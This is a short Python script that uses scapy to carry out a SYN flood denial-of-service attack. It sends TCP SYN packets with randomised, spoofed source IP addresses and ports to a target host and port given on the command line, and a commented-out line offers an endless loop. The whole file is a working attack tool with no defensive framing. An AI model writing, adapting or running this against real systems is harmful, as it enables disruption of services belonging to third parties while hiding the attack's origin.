from sys import stdout
from scapy.all import *
from random import randint
from ArgumentParser import ArgumentParser


def randomInt():
    return randint(8000, 9000)


def SynFlood(destination_ip, destination_port, packet_num):
    sent_count = 0

    # while True: # Uncomment if you want to call infinitive
    for x in range(0, packet_num):
        random_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
        random_port = randomInt()

        ip_layer = IP(
            dst=destination_ip,
            src=random_ip
        )
        tcp_layer = TCP(
            sport=random_port,
            dport=destination_port,
            flags="S",
            seq=randomInt(),
            window=randomInt(),
        )
        # Combine
        packets = ip_layer / tcp_layer

        send(packets, verbose=0)
        sent_count += 1
        stdout.writelines("Sending from " + random_ip + ":" + str(random_port) + " -> " + destination_ip + ":" + str(destination_port) + "\n")

    stdout.writelines("Packets sent: %i\n" % sent_count)


if __name__ == "__main__":
    usage_cmd = 'Usage: \n'
    usage_cmd += ' ' + os.path.basename(__file__)
    usage_cmd += ' -h <destination_ip> -p <destination_port> -c <loop_count>'

    raw_input = ArgumentParser(sys.argv[1:], usage_cmd)

    if not raw_input.validate():
        raw_input.print_usage()
        exit(2)

    # Parse & get argument value
    args = raw_input.parse(["h", "p", "c"], ["host=", "port=", "count="])
    host = raw_input.get_value_by_key("-h", args)
    port = raw_input.get_value_by_key("-p", args)
    count = raw_input.get_value_by_key("-c", args)

    SynFlood(host, int(port), int(count))
